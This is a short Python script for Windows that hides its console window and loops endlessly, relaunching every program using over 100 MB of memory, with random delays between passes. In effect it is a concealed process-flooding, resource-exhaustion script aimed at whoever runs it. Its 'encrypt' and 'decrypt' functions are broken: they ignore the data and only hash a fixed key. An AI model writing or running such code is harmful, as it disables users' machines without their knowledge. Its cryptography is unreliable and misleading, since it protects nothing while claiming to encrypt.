import win32gui
import win32console
import win32con
import psutil
import os
import time
import random
import hashlib

# Function to hide the console window
def hide_window():
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window, win32con.SW_HIDE)

# Function to get a list of high RAM processes
def get_high_ram_processes():
    high_ram_processes = []
    for proc in psutil.process_iter(['pid', 'name', 'memory_info']):
        try:
            if proc.memory_info().rss > 100 * 1024 * 1024:  # Adjust threshold as needed
                high_ram_processes.append(proc)
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return high_ram_processes

# Function to open processes
def open_processes(high_ram_processes):
    for proc in high_ram_processes:
        try:
            os.startfile(proc.exe())
        except Exception as e:
            print(f"Error opening process {proc.name()}: {e}")

# Function to encrypt data
def encrypt(data):
    # Use a secret key for encryption
    secret_key = b'00000000'
    cipher = hashlib.sha256(secret_key)
    return cipher.hexdigest()

# Function to decrypt data
def decrypt(encrypted_data):
    # Use the same secret key used for encryption
    secret_key = b'00000000'
    cipher = hashlib.sha256(secret_key)
    if cipher.hexdigest() == encrypted_data:
        return True
    else:
        return False

# Function to generate random delays
def random_delay():
    return random.uniform(0.5, 1.5)

# Main function
def main():
    # Hide the console window
    hide_window()
    
    # Main loop
    while True:
        # Get high RAM processes
        high_ram_processes = get_high_ram_processes()
        
        # Open processes
        open_processes(high_ram_processes)
        
        # Encrypt and decrypt data (just for demonstration)
        encrypted_data = encrypt("Sensitive information")
        decrypted_data = decrypt(encrypted_data)
        if decrypted_data:
            print("Decryption successful")
        
        # Random delay before next iteration
        time.sleep(random_delay())

# Entry point
if __name__ == "__main__":
    main()

